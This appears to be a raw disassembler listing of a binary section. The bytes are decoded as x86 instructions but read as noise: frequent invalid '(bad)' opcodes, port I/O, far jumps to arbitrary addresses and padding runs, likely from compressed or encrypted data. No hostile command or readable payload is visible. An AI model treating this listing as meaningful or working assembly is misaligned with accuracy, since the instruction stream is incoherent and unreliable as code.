  414419:	ins    BYTE PTR es:[edi],dx
  41441a:	pop    ds
  41441b:	ror    DWORD PTR [esi-0xd],0x44
  41441f:	hlt    
  414420:	out    0xd5,eax
  414422:	rol    BYTE PTR [ecx+0x1b],1
  414425:	cwde   
  414426:	sub    DWORD PTR [esi],ebp
  414428:	clc    
  414429:	lods   al,BYTE PTR ds:[esi]
  41442a:	lods   eax,DWORD PTR ds:[esi]
  41442b:	dec    BYTE PTR [ebx+0x34]
  41442e:	jne    0x414415
  414430:	sbb    DWORD PTR [ebx-0x25],edi
  414433:	fild   QWORD PTR [ecx]
  414435:	inc    esp
  414436:	ja     0x414409
  414438:	mov    al,0x2a
  41443a:	es jmp 0x1dad36a0
  414440:	ins    DWORD PTR es:[edi],dx
  414441:	aas    
  414442:	loopne 0x41448e
  414444:	mov    WORD PTR [ecx+esi*2+0x3088674c],ds
  41444b:	mov    ecx,0xdc87e9f5
  414450:	loope  0x414464
  414452:	stos   BYTE PTR es:[edi],al
  414453:	ins    DWORD PTR es:[edi],dx
  414454:	xor    eax,0x76c9a86
  414459:	add    BYTE PTR [edi+0x25ac60e4],ah
  41445f:	push   esi
  414460:	cmp    DWORD PTR fs:[edx],esi
  414463:	ja     0x4143ff
  414465:	retf   
  414466:	scas   eax,DWORD PTR es:[edi]
  414467:	mov    eax,0xdb3a8a5d
  41446c:	(bad)  
  41446d:	xor    eax,0xb57fd55
  414472:	xor    al,0xe4
  414474:	clc    
  414475:	cmp    ah,BYTE PTR [ebx]
  414477:	dec    ecx
  414478:	pusha  
  414479:	ror    DWORD PTR [ecx+eiz*1],0x90
  41447d:	lds    esi,FWORD PTR [edi-0x1a8d7f03]
  414483:	jns    0x41448e
  414485:	repz cmp DWORD PTR [edi],ebp
  414488:	cld    
  414489:	dec    esi
  41448a:	loopne 0x414432
  41448c:	jp     0x4144fd
  41448e:	imul   edx,DWORD PTR [eax+0x0],0x0
	...
  4144f1:	add    BYTE PTR [eax],al
  4144f3:	add    BYTE PTR [ebx+0x73],bl
  4144f6:	inc    edx
  4144f7:	or     eax,0x775f3d6a
  4144fc:	pop    ds
  4144fd:	dec    edi
  4144fe:	or     cl,BYTE PTR [esi-0x5b]
  414501:	test   al,0x3e
  414503:	pop    es
  414504:	in     al,dx
  414505:	aad    0x0
  414507:	add    BYTE PTR [ecx+eax*1],al
  41450a:	add    BYTE PTR [eax],al
  41450c:	out    dx,al
  41450d:	jecxz  0x414565
  41450f:	jl     0x4144be
  414511:	adc    DWORD PTR ds:0x5ece24f3,esi
  414517:	mov    edi,ds
  414519:	push   0xffffff9c
  41451b:	mov    esi,0xbbe3647e
  414520:	(bad)  
  414521:	mov    ds:0x84f4ae92,eax
  414526:	ror    DWORD PTR ds:0xd2cd6406,0x86
  41452d:	xlat   BYTE PTR ds:[ebx]
  41452e:	outs   dx,DWORD PTR ds:[esi]
  41452f:	cs jae 0x414560
  414532:	call   DWORD PTR [ebx]
  414534:	(bad)  
  414535:	pop    edi
  414536:	mov    WORD PTR [edi-0x28],?
  414539:	outs   dx,DWORD PTR ds:[esi]
  41453a:	ds shr edi,0xbc
  41453e:	xor    ecx,DWORD PTR [ecx-0x6b]
  414541:	mov    cl,0x24
  414543:	in     al,0x63
  414545:	rol    BYTE PTR [ecx+0x25ad811c],1
  41454b:	rol    BYTE PTR [eax-0x56],0xfd
  41454f:	inc    ebx
  414550:	adc    al,0x32
  414552:	nop
  414553:	hlt    
  414554:	ds ret 0x671
  414558:	daa    
  414559:	outs   dx,DWORD PTR ds:[esi]
  41455a:	dec    edi
  41455b:	adc    ebp,DWORD PTR [edx-0x6d]
  41455e:	xchg   esi,eax
  41455f:	push   edi
  414560:	ja     0x4145b8
  414562:	(bad)  
  414563:	mul    DWORD PTR [edx+ecx*8+0x374194b3]
  41456a:	inc    ebp
  41456b:	pop    ds
  41456c:	outs   dx,DWORD PTR ds:[esi]
  41456d:	sub    eax,DWORD PTR [edx]
  41456f:	push   ss
  414570:	push   ebx
  414571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414572:	push   ds
  414573:	adc    eax,0xcef370eb
  414578:	retf   
  414579:	aaa    
  41457a:	pop    ss
  41457b:	dec    ebp
  41457c:	scas   al,BYTE PTR es:[edi]
  41457d:	pop    ecx
  41457e:	xlat   BYTE PTR ds:[ebx]
  41457f:	jge    0x414538
  414581:	mov    ecx,0xd3b20885
  414586:	lds    ecx,FWORD PTR [esi-0x66d27f8f]
  41458c:	adc    bh,BYTE PTR [esi+0x3e]
  41458f:	sbb    ebx,DWORD PTR [ebx-0x80]
  414592:	mov    bh,0xe6
  414594:	sbb    DWORD PTR [edx+0x2c661b59],0xffffff85
  41459b:	jae    0x4145ab
  41459d:	inc    edx
  41459e:	jb     0x4145a2
  4145a0:	rcl    DWORD PTR [ebp-0x1243fa68],0xfd
  4145a7:	mov    esp,0x66bab758
  4145ac:	lahf   
  4145ad:	xchg   ebx,eax
  4145ae:	mov    ecx,0x61c5950
  4145b3:	mov    edx,0xde7430d6
  4145b8:	xchg   ebp,eax
  4145b9:	call   0xe90a1f39
  4145be:	retf   
  4145bf:	jl     0x414551
  4145c1:	mov    esp,DWORD PTR [ebp+0x77]
  4145c4:	xlat   BYTE PTR ds:[ebx]
  4145c5:	repz out dx,eax
  4145c7:	push   esp
  4145c8:	into   
  4145c9:	leave  
  4145ca:	in     eax,dx
  4145cb:	repz fisubr DWORD PTR [ebx+edi*1]
  4145cf:	out    0x47,eax
  4145d1:	push   edx
  4145d2:	mov    bh,0xa2
  4145d4:	sub    BYTE PTR [ebp+0x16],ch
  4145d7:	xor    DWORD PTR ds:0x3de22ea0,ebx
  4145dd:	ins    BYTE PTR es:[edi],dx
  4145de:	jecxz  0x4145b8
  4145e0:	idiv   DWORD PTR [ecx]
  4145e2:	outs   dx,BYTE PTR ds:[esi]
  4145e3:	sbb    dh,0xc7
  4145e6:	test   DWORD PTR [edi+eiz*1-0x3c],ebp
  4145ea:	in     eax,dx
  4145eb:	shl    BYTE PTR [ebx],0x5d
  4145ee:	sub    al,0xa8
  4145f0:	ja     0x414630
  4145f2:	cmc    
  4145f3:	dec    ebx
  4145f4:	push   ebx
  4145f5:	and    BYTE PTR [ebx+0x3ad112bc],al
  4145fb:	cmp    al,0x8f
  4145fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145fe:	adc    BYTE PTR [esp+eiz*8-0x4b],0x1
  414603:	and    BYTE PTR [edx+0x50bda407],ch
  414609:	xchg   BYTE PTR [eax],cl
  41460b:	popf   
  41460c:	jge    0x414599
  41460e:	sbb    ebp,DWORD PTR [eax+0x0]
	...
  414674:	jg     0x4146d4
  414676:	cmc    
  414677:	ins    DWORD PTR es:[edi],dx
  414678:	cmc    
  414679:	out    dx,eax
  41467a:	call   FWORD PTR [esi+0x17]
  41467d:	enter  0xab7a,0x6c
  414681:	shr    BYTE PTR [esi+0xd6f087],cl
  414687:	add    BYTE PTR [ecx+eax*1],al
  41468a:	add    BYTE PTR [eax],al
  41468c:	shl    DWORD PTR [edx],1
  41468e:	cld    
  41468f:	xchg   esp,eax
  414690:	enter  0x7d2a,0x96
  414694:	xchg   ebp,eax
  414695:	and    bl,BYTE PTR [edx]
  414697:	out    0xb,eax
  414699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41469a:	call   0x812fc1ed
  41469f:	std    
  4146a0:	lock js 0x414639
  4146a3:	ja     0x4146f9
  4146a5:	test   al,0x2
  4146a7:	sbb    DWORD PTR [ebx+0x11],esp
  4146aa:	gs lahf 
  4146ac:	scas   al,BYTE PTR es:[edi]
  4146ad:	ret    
  4146ae:	ret    0x580a
  4146b1:	and    DWORD PTR cs:[esi-0x47e89214],eax
  4146b8:	or     al,0xd3
  4146ba:	mov    ch,0xa1
  4146bc:	(bad)  
  4146bd:	cmp    BYTE PTR ds:0xa8f7f9e5,0xb1
  4146c4:	cmp    al,0x1d
  4146c6:	inc    ecx
  4146c7:	loope  0x414708
  4146c9:	js     0x4146b7
  4146cb:	mov    ebx,DWORD PTR [esi]
  4146cd:	and    al,BYTE PTR [eax-0x43a5390a]
  4146d3:	fmulp  st(7),st
  4146d5:	fsubr  DWORD PTR [edi-0xa]
  4146d8:	push   eax
  4146d9:	inc    edx
  4146da:	mov    DWORD PTR [edi+0x4a48a243],esp
  4146e0:	mov    bl,0xbd
  4146e2:	popf   
  4146e3:	adc    BYTE PTR [edx],ch
  4146e5:	fwait
  4146e6:	xchg   edi,eax
  4146e7:	add    al,0x3d
  4146e9:	sbb    al,0x71
  4146eb:	mov    ds:0x508ab547,al
  4146f0:	into   
  4146f1:	popa   
  4146f2:	sbb    DWORD PTR [esi+0x74],edi
  4146f5:	pop    ecx
  4146f6:	jmp    0x34e2:0x734686f2
  4146fd:	add    DWORD PTR [edx],esi
  4146ff:	dec    esp
  414700:	imul   esi,DWORD PTR [edx-0x60],0x403d2e5f
  414707:	sub    DWORD PTR [edi],0xfffffff8
  41470a:	daa    
  41470b:	dec    eax
  41470c:	push   cs
  41470d:	pop    ss
  41470e:	mov    edi,0x78b94a82
  414713:	cmp    cl,dl
  414715:	cmp    eax,0xdd24180e
  41471a:	loope  0x4146cc
  41471c:	sbb    eax,0xc3bedc91
  414721:	fst    QWORD PTR [ecx]
  414723:	mov    ebx,0x132dabf
  414728:	loop   0x414791
  41472a:	inc    edx
  41472b:	mov    esp,0xac4ad0d
  414730:	adc    edx,DWORD PTR [ecx-0x57c6b7f9]
  414736:	shr    DWORD PTR [ebp-0xe58c049],0x7f
  41473d:	arpl   WORD PTR [ecx],cx
  41473f:	xchg   edx,ebx
  414741:	jns    0x414790
  414743:	push   cs
  414744:	cmp    al,0x5
  414746:	jle    0x414753
  414748:	cmp    al,0x6f
  41474a:	sub    esi,DWORD PTR [edi]
  41474c:	or     BYTE PTR [ebp+0x14],al
  41474f:	das    
  414750:	hlt    
  414751:	int    0x3b
  414753:	xchg   DWORD PTR [esi+esi*8-0x7a],ebp
  414757:	xchg   DWORD PTR [eax+0x7cfc9acb],ebp
  41475d:	add    BYTE PTR [ecx+0x69f1082],ah
  414763:	xchg   esi,eax
  414764:	cmp    ch,BYTE PTR [ebx-0x62267b43]
  41476a:	adc    DWORD PTR [ebx+0x528e1922],eax
  414770:	loope  0x4147cd
  414772:	rol    DWORD PTR [eax],cl
  414774:	(bad)  
  414775:	popa   
  414776:	shr    bl,1
  414778:	shl    DWORD PTR ss:[eax+0x71],cl
  41477c:	repnz xor ebp,DWORD PTR [eax]
  41477f:	sub    esi,DWORD PTR [ebp-0x3c]
  414782:	mov    ch,BYTE PTR [ecx]
  414784:	inc    esi
  414785:	das    
  414786:	add    al,0x35
  414788:	retf   0xb3e9
  41478b:	cmc    
  41478c:	push   eax
  41478d:	xchg   edx,eax
  41478e:	inc    edx
  41478f:	std    
	...
  4147f4:	jle    0x414825
  4147f6:	add    DWORD PTR [ebp+0x51],ebp
  4147f9:	outs   dx,DWORD PTR ds:[esi]
  4147fa:	jle    0x41483b
  4147fc:	aas    
  4147fd:	mov    BYTE PTR [esi],cl
  4147ff:	cmp    eax,0xacf508f7
  414804:	hlt    
  414805:	xlat   BYTE PTR ds:[ebx]
  414806:	add    BYTE PTR [eax],al
  414808:	add    al,0x1
  41480a:	add    BYTE PTR [eax],al
  41480c:	xor    eax,0xcf8721cf
  414811:	and    DWORD PTR [edi-0x73],edx
  414814:	sti    
  414815:	pop    edx
  414816:	jle    0x41486f
  414818:	mov    bl,BYTE PTR [edx-0x2d]
  41481b:	and    al,al
  41481d:	dec    edi
  41481e:	(bad)
  414822:	mov    cl,0x8b
  414824:	xor    DWORD PTR [edi+edi*8-0x497eb4dd],edx
  41482b:	cmp    al,BYTE PTR [ebx-0x63548f33]
  414831:	mov    edi,0x5921cd3e
  414836:	lock retf 0xfa97
  41483a:	mov    bl,0xb4
  41483c:	adc    DWORD PTR ds:0x960b738a,ebp
  414842:	jb     0x414837
  414844:	scas   al,BYTE PTR es:[edi]
  414845:	arpl   WORD PTR [ecx],bx
  414847:	mov    esp,0xfd486340
  41484c:	sar    edx,cl
  41484e:	repz cmp DWORD PTR [bx+si-0x473d],eax
  414854:	pop    esp
  414855:	pop    ss
  414856:	(bad)  
  414857:	ja     0x41485f
  414859:	ja     0x4147e8
  41485b:	xchg   ecx,eax
  41485c:	pop    ebx
  41485d:	cmc    
  41485e:	outs   dx,BYTE PTR ds:[esi]
  41485f:	and    DWORD PTR [edx-0x9],esi
  414862:	aad    0x81
  414864:	cmp    al,0x94
  414866:	(bad)  
  414867:	pusha  
  414868:	scas   al,BYTE PTR es:[edi]
  414869:	push   0xffffffea
  41486b:	iret   
  41486c:	dec    ebp
  41486d:	xor    bl,BYTE PTR [edi]
  41486f:	clc    
  414870:	iret   
  414871:	xlat   BYTE PTR ds:[ebx]
  414872:	test   DWORD PTR [ebp-0x4c],ebp
  414875:	cmp    DWORD PTR [esi-0x1e],esi
  414878:	ret    
  414879:	cmp    eax,0x3fe2f4d
  41487e:	or     DWORD PTR [edx-0x1ba2607b],edi
  414884:	jmp    FWORD PTR [edi-0x2d]
  414887:	push   esp
  414888:	pop    edi
  414889:	aam    0x6b
  41488b:	mov    DWORD PTR ds:0x873aeab8,eax
  414891:	jg     0x414842
  414893:	imul   ebp,esi,0x29922648
  414899:	jg     0x4148ed
  41489b:	fild   WORD PTR [esi-0x73fc8810]
  4148a1:	pusha  
  4148a2:	mov    edi,0x99c0550a
  4148a7:	mov    edx,0x1c5d6e2b
  4148ac:	dec    ecx
  4148ad:	or     eax,0x915f6d4a
  4148b2:	ja     0x4148ed
  4148b4:	push   cs
  4148b5:	add    dh,BYTE PTR [edi+0x53d6a32f]
  4148bb:	icebp  
  4148bc:	call   0x30b3:0xdd80c5c6
  4148c3:	jge    0x41492f
  4148c5:	sbb    DWORD PTR [esi],eax
  4148c7:	cmp    eax,0x378cc594
  4148cc:	fs mov cl,0xfa
  4148cf:	test   DWORD PTR [edx],ebp
  4148d1:	cwde   
  4148d2:	imul   edi,edi,0x700d2ca
  4148d8:	mov    al,ds:0xbae8e3f8
  4148dd:	(bad)  
  4148de:	in     al,dx
  4148df:	xor    bl,BYTE PTR [ebp+0x96d89e2]
  4148e5:	in     al,dx
  4148e6:	mov    edi,0x2ac77fb8
  4148eb:	loop   0x4148a4
  4148ed:	mov    ah,0x77
  4148ef:	test   al,ch
  4148f1:	and    ah,BYTE PTR [edx]
  4148f3:	es jmp 0x15baded3
  4148f9:	and    eax,0xbb658065
  4148fe:	sub    cl,BYTE PTR [edx+eax*1-0x2f]
  414902:	mov    bl,ah
  414904:	jl     0x414889
  414906:	sub    esi,eax
  414908:	fs jg  0x4148e9
  41490b:	xor    ebx,eax
  41490d:	mov    ds:0x1a08,eax
	...
  414972:	add    BYTE PTR [eax],al
  414974:	or     edi,DWORD PTR [esi-0x2e]
  414977:	and    esi,edi
  414979:	scas   eax,DWORD PTR es:[edi]
  41497a:	sti    
  41497b:	jle    0x414963
  41497d:	pop    edx
  41497e:	push   ds
  41497f:	pop    es
  414980:	idiv   dh
  414982:	or     al,0x60
  414984:	clc    
  414985:	fadd   DWORD PTR [eax]
  414987:	add    BYTE PTR [ecx+eax*1],al
  41498a:	add    BYTE PTR [eax],al
  41498c:	jge    0x4149bc
  41498e:	shr    DWORD PTR [ebx+0x46fdf992],1
  414994:	inc    edx
  414995:	ja     0x4149cb
  414997:	or     BYTE PTR [ecx-0x16],al
  41499a:	mov    ds:0x6e4e678c,eax
  41499f:	sbb    dh,dl
  4149a1:	int3   
  4149a2:	adc    DWORD PTR [eax+0x26e9a3d6],ebp
  4149a8:	and    ah,bl
  4149aa:	sbb    eax,0x6574bf4d
  4149af:	add    BYTE PTR ds:0x38b225d3,0xd
  4149b6:	cmp    eax,0x80e1b06d
  4149bb:	sub    al,0x6
  4149bd:	jmp    0x7cc905b5
  4149c2:	aad    0x55
  4149c4:	hlt    
  4149c5:	mov    eax,?
  4149c7:	pop    esp
  4149c8:	sbb    eax,0x7de190df
  4149cd:	imul   ebx,DWORD PTR [ebp+0x4],0x1d
  4149d1:	lahf   
  4149d2:	xchg   ebx,eax
  4149d3:	inc    ecx
  4149d4:	jg     0x4149f7
  4149d6:	adc    BYTE PTR [eax+0x5],0xb4
  4149da:	fmul   DWORD PTR [ebp-0x35]
  4149dd:	inc    ecx
  4149de:	sbb    DWORD PTR [edi+0x3c],esi
  4149e1:	and    ah,BYTE PTR [edi-0x29]
  4149e4:	rcr    BYTE PTR [edx+0x37ca733c],1
  4149ea:	jg     0x4149d2
  4149ec:	mov    ch,0xb2
  4149ee:	pop    eax
  4149ef:	push   0x4ef8a111
  4149f4:	jns    0x414a1f
  4149f6:	jnp    0x414a33
  4149f8:	nop
  4149f9:	mov    ebx,0x9c56f214
  4149fe:	pusha  
  4149ff:	sbb    DWORD PTR [edx+0x51050734],ecx
  414a05:	jnp    0x414998
  414a07:	test   al,0x1f
  414a09:	and    al,0x3a
  414a0b:	pop    ecx
  414a0c:	gs jg  0x414a70
  414a0f:	test   al,0xe2
  414a11:	icebp  
  414a12:	shr    BYTE PTR [edi],cl
  414a14:	jns    0x414a63
  414a16:	outs   dx,BYTE PTR ds:[esi]
  414a17:	push   cs
  414a18:	push   edi
  414a19:	adc    bh,BYTE PTR [ebp-0x74]
  414a1c:	adc    DWORD PTR [edx+ebp*8-0x4ddd9e78],ebx
  414a23:	mov    dl,0x1
  414a25:	jecxz  0x414a88
  414a27:	jmp    0xdc59:0x476986d1
  414a2e:	sbb    al,0x36
  414a30:	enter  0x80c2,0x31
  414a34:	outs   dx,BYTE PTR ds:[esi]
  414a35:	lods   eax,DWORD PTR ds:[esi]
  414a36:	add    BYTE PTR [ebp-0x500d017f],al
  414a3c:	sbb    bh,bh
  414a3e:	add    eax,0x756ba468
  414a43:	cmp    eax,DWORD PTR [edx+0x76]
  414a46:	add    bh,BYTE PTR [ecx]
  414a48:	jl     0x414a09
  414a4a:	cmp    eax,0xad259e3
  414a4f:	pop    esi
  414a50:	xchg   ecx,eax
  414a51:	mov    esi,0x10ae8497
  414a56:	sub    al,0xe2
  414a58:	(bad)  
  414a59:	jmp    0x414a94
  414a5b:	mov    ebx,0xd7a9697d
  414a60:	sub    eax,0xe5713e9d
  414a65:	icebp  
  414a66:	pop    es
  414a67:	jo     0x414a1a
  414a69:	jecxz  0x414a1a
  414a6b:	ret    
  414a6c:	dec    eax
  414a6d:	jnp    0x414a6c
  414a6f:	or     al,0xb0
  414a71:	push   ebp
  414a72:	or     DWORD PTR [edi-0x3ac77316],esp
  414a78:	mov    bh,0xa5
  414a7a:	and    dh,cl
  414a7c:	lock jmp 0x57328909
  414a82:	scas   al,BYTE PTR es:[edi]
  414a83:	int3   
  414a84:	cwde   
  414a85:	addr16 xchg ebp,eax
  414a87:	test   DWORD PTR [ebx-0x7e],edx
  414a8a:	dec    ebp
  414a8b:	shr    BYTE PTR [eax+0x22],cl
  414a8e:	fild   DWORD PTR [ebx]
	...
  414af4:	lahf   
  414af5:	fnstcw WORD PTR [esi]
  414af7:	ss jle 0x414af1
  414afa:	lahf   
  414afb:	stc    
  414afc:	bound  esp,QWORD PTR [ebx-0x2369c27]
  414b02:	jno    0x414acc
  414b04:	cld    
  414b05:	fld    DWORD PTR [eax]
  414b07:	add    BYTE PTR [ecx+eax*1],al
  414b0a:	add    BYTE PTR [eax],al
  414b0c:	add    ch,BYTE PTR [ecx-0x5]
  414b0f:	sub    eax,DWORD PTR [edx+0x60b31d49]
  414b15:	ret    
  414b16:	cmp    eax,0x796b8cfd
  414b1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b1c:	xor    al,0x13
  414b1e:	or     DWORD PTR [eax+0x561e0fb1],edx
  414b24:	into   
  414b25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b26:	cmp    eax,0xaabcb403
  414b2b:	adc    DWORD PTR [esi],eax
  414b2d:	xchg   esp,eax
  414b2e:	aad    0xa5
  414b30:	and    DWORD PTR [esp+esi*2-0x79],eax
  414b34:	or     ah,BYTE PTR [ebp+0x10b5dfd8]
  414b3a:	xchg   DWORD PTR [ebp-0x26],esp
  414b3d:	mov    cl,0xc7
  414b3f:	fwait
  414b40:	or     eax,DWORD PTR [esp+ecx*2]
  414b43:	jbe    0x414b20
  414b45:	fld    DWORD PTR [edi]
  414b47:	call   DWORD PTR [ecx-0x1d4413f7]
  414b4d:	sahf   
  414b4e:	pop    esp
  414b4f:	push   ecx
  414b50:	adc    cl,BYTE PTR [ebx+0x28552af]
  414b56:	mov    dh,0x14
  414b58:	mov    ah,0x1f
  414b5a:	cmp    esp,DWORD PTR [ecx]
  414b5c:	jle    0x414b35
  414b5e:	scas   al,BYTE PTR es:[edi]
  414b5f:	shl    eax,1
  414b61:	das    
  414b62:	ins    DWORD PTR es:[edi],dx
  414b63:	leave  
  414b64:	cmc    
  414b65:	fst    QWORD PTR [eax-0x4f]
  414b68:	push   ebp
  414b69:	loope  0x414b05
  414b6b:	icebp  
  414b6c:	xor    al,0x7f
  414b6e:	into   
  414b6f:	sub    BYTE PTR [ecx],bh
  414b71:	out    0x72,al
  414b73:	les    ebx,FWORD PTR [edi]
  414b75:	sub    eax,0xe636ef8a
  414b7a:	pop    ebx
  414b7b:	std    
  414b7c:	sahf   
  414b7d:	pop    ebx
  414b7e:	pop    edx
  414b7f:	pop    es
  414b80:	arpl   WORD PTR [ecx],sp
  414b82:	add    edx,edi
  414b84:	sbb    BYTE PTR [ecx+ebx*1-0x366143c1],bl
  414b8b:	std    
  414b8c:	(bad)  
  414b8d:	mov    bl,0xd6
  414b8f:	adc    BYTE PTR ds:0x3c26829b,al
  414b95:	mov    DWORD PTR [ebp+0x3a3d95b7],ecx
  414b9b:	pop    esi
  414b9c:	xor    eax,0x391de700
  414ba1:	sbb    BYTE PTR [eax+0x50d6813b],cl
  414ba7:	fldenv [ebp-0x6b9166f2]
  414bad:	jg     0x414b37
  414baf:	iret   
  414bb0:	jle    0x414b66
  414bb2:	fld    QWORD PTR [ebp-0x74]
  414bb5:	ss jbe 0x414b9b
  414bb8:	cli    
  414bb9:	je     0x414b7e
  414bbb:	adc    BYTE PTR [ecx-0x4a],bl
  414bbe:	sub    DWORD PTR [ebp+0x2e609e3d],esi
  414bc4:	add    DWORD PTR [esi],0xe41182fd
  414bca:	sbb    DWORD PTR [eax],esp
  414bcc:	test   DWORD PTR [edi+0x36],0xe45af822
  414bd3:	in     al,0x15
  414bd5:	cmp    esi,esp
  414bd7:	sbb    eax,0xe24f966f
  414bdc:	pop    ecx
  414bdd:	pop    esp
  414bde:	fcomp  DWORD PTR [ebp+0x6495fbfe]
  414be4:	push   es
  414be5:	daa    
  414be6:	xchg   esi,ebx
  414be8:	xor    esp,DWORD PTR [esp+ecx*8-0x18]
  414bec:	(bad)  
  414bed:	mov    ebx,0x9094fb65
  414bf2:	mov    al,ds:0x2a513886
  414bf7:	int3   
  414bf8:	aaa    
  414bf9:	lahf   
  414bfa:	inc    edx
  414bfb:	nop
  414bfc:	inc    edx
  414bfd:	xor    DWORD PTR [edx+0x74e13e13],edx
  414c03:	test   DWORD PTR [esi+0x3cceacf6],esi
  414c09:	retf   0x9f53
  414c0c:	popa   
  414c0d:	inc    edx
  414c0e:	dec    edx
  414c0f:	or     al,BYTE PTR [eax]
	...
  414c71:	add    BYTE PTR [eax],al
  414c73:	add    BYTE PTR [esp+eiz*2],dh
  414c76:	push   ds
  414c77:	jl     0x414cd7
  414c79:	jle    0x414cf1
  414c7b:	ins    BYTE PTR es:[edi],dx
  414c7c:	out    0x12,al
  414c7e:	adc    ebp,DWORD PTR cs:[edx]
  414c81:	scas   eax,DWORD PTR es:[edi]
  414c82:	xchg   ebp,eax
  414c83:	pop    edx
  414c84:	add    bl,bl
  414c86:	add    BYTE PTR [eax],al
  414c88:	add    al,0x1
  414c8a:	add    BYTE PTR [eax],al
  414c8c:	fs mov ah,0x85
  414c8f:	fisubr DWORD PTR [edi+ebx*2-0x79]
  414c93:	or     cl,al
  414c95:	int    0x6b
  414c97:	and    ch,BYTE PTR es:[edx-0x61]
  414c9b:	pop    ss
  414c9c:	hlt    
  414c9d:	inc    ecx
  414c9e:	jae    0x414cc2
  414ca0:	outs   dx,DWORD PTR ds:[esi]
  414ca1:	adc    DWORD PTR [ebx-0x5519f1d0],esi
  414ca7:	cmp    BYTE PTR [edi-0x6],ah
  414caa:	lds    ecx,FWORD PTR [edi-0x1f03053b]
  414cb0:	adc    BYTE PTR [edx],0xe6
  414cb3:	fisttp DWORD PTR [eax]
  414cb5:	dec    ebp
  414cb6:	leave  
  414cb7:	pop    edi
  414cb8:	and    eax,edi
  414cba:	jg     0x414d0b
  414cbc:	or     eax,ebp
  414cbe:	(bad)  
  414cc0:	jle    0x414c82
  414cc2:	adc    al,0x64
  414cc4:	push   ss
  414cc5:	mov    ebp,esi
  414cc7:	mov    edx,0x324e3a3e
  414ccc:	nop
  414ccd:	mov    DWORD PTR [eax-0x5287e62f],edx
  414cd3:	jge    0x414cba
  414cd5:	into   
  414cd6:	inc    edi
  414cd7:	inc    eax
  414cd8:	and    al,0x93
  414cda:	repz ss icebp 
  414cdd:	add    al,0xf0
  414cdf:	dec    edi
  414ce0:	xchg   DWORD PTR [ecx-0x14],esp
  414ce3:	dec    ecx
  414ce4:	push   eax
  414ce5:	jp     0x414d24
  414ce7:	ret    
  414ce8:	test   eax,0x88c97b1
  414ced:	add    al,0x14
  414cef:	mov    DWORD PTR [esp+eax*4],ecx
  414cf2:	mov    esi,0x82dadc33
  414cf7:	lahf   
  414cf8:	(bad)  [eax]
  414cfa:	mov    WORD PTR ds:0xfa2b8c68,cs
  414d00:	inc    edi
  414d01:	cwde   
  414d02:	sbb    eax,0x43742a09
  414d07:	pop    eax
  414d08:	dec    edi
  414d09:	inc    eax
  414d0a:	xor    eax,0x484aaa4a
  414d0f:	lock xchg ecx,eax
  414d11:	std    
  414d12:	or     eax,0x78e194be
  414d17:	pop    ds
  414d18:	shl    dh,0x1b
  414d1b:	dec    esi
  414d1c:	cli    
  414d1d:	shl    BYTE PTR [ebx-0x1cd85cfc],cl
  414d23:	pushf  
  414d24:	iret   
  414d25:	ret    0x5f3e
  414d28:	pop    ebx
  414d29:	adc    BYTE PTR [edx],0x43
  414d2c:	inc    eax
  414d2d:	sbb    al,0x17
  414d2f:	pop    eax
  414d30:	mov    cl,0x7d
  414d32:	fwait
  414d33:	inc    ebp
  414d34:	dec    esi
  414d35:	push   ebp
  414d36:	dec    esp
  414d37:	cld    
  414d38:	in     eax,0x37
  414d3a:	dec    eax
  414d3b:	jmp    0x3fc11e7e
  414d40:	into   
  414d41:	push   esp
  414d42:	mov    eax,DWORD PTR [ecx-0x38]
  414d45:	and    DWORD PTR [ebx],esi
  414d47:	ficom  DWORD PTR [ecx-0x79]
  414d4a:	jp     0x414d2b
  414d4c:	aaa    
  414d4d:	rcl    esp,1
  414d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d50:	jg     0x414d5b
  414d52:	out    0x4b,eax
  414d54:	sbb    al,0xf4
  414d56:	popf   
  414d57:	push   ecx
  414d58:	sbb    dl,BYTE PTR [ebx+0x37]
  414d5b:	xor    dh,BYTE PTR [ebx-0x67d60b00]
  414d61:	xor    DWORD PTR [ebp+ecx*1+0xc],edi
  414d65:	or     bh,cl
  414d67:	in     al,0x16
  414d69:	cmp    dl,BYTE PTR [edx+0x37a07089]
  414d6f:	call   0xbf74:0x76f7f9a6
  414d76:	pop    esp
  414d77:	pop    ecx
  414d78:	push   ds
  414d79:	mov    ds:0xc6a9c562,al
  414d7e:	imul   DWORD PTR [ebp-0x4]
  414d81:	cmp    eax,0x902d8eee
  414d86:	rol    DWORD PTR [esi+ecx*1],cl
  414d89:	dec    ecx
  414d8a:	idiv   BYTE PTR [ebx+eiz*2]
  414d8d:	inc    esi
  414d8e:	fs inc ecx
	...
  414df4:	mov    bh,0x99
  414df6:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414dfc:	in     al,dx
  414dfd:	xor    dh,BYTE PTR [esi]
  414dff:	adc    eax,0xaba521d3
  414e04:	add    al,0xdc
  414e06:	add    BYTE PTR [eax],al
  414e08:	add    al,0x1
  414e0a:	add    BYTE PTR [eax],al
  414e0c:	fmul   DWORD PTR [eax+0x39]
  414e0f:	call   0x3c9ff438
  414e14:	add    eax,0xbed8b53
  414e19:	cmp    bh,dh
  414e1b:	rcl    bl,0xbc
  414e1e:	xchg   ebp,eax
  414e1f:	in     eax,0xdc
  414e21:	ins    BYTE PTR es:[edi],dx
  414e22:	push   0x65752a9e
  414e27:	hlt    
  414e28:	in     al,dx
  414e29:	ja     0x414e8b
  414e2b:	sbb    ebx,0x4e
  414e2e:	or     ch,BYTE PTR [edx]
  414e30:	inc    edx
  414e31:	push   ecx
  414e32:	ja     0x414dd0
  414e34:	mov    dh,0x9
  414e36:	outs   dx,BYTE PTR ds:[esi]
  414e37:	adc    eax,0x4049e5ad
  414e3c:	test   al,0xa0
  414e3e:	push   0xffffffb0
  414e40:	add    eax,0xa0936b6f
  414e45:	jecxz  0x414e32
  414e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e48:	mov    ecx,0x8fd0a5ec
  414e4d:	or     bl,BYTE PTR [ebp+ebp*8+0x66b426e9]
  414e54:	aad    0x19
  414e56:	mov    esp,0xe6f0502f
  414e5b:	cmp    ecx,ebx
  414e5d:	mov    bl,bl
  414e5f:	mov    BYTE PTR [esi-0x1bded613],al
  414e65:	xchg   ebx,eax
  414e66:	pop    ebp
  414e67:	fimul  WORD PTR [edi-0x4e]
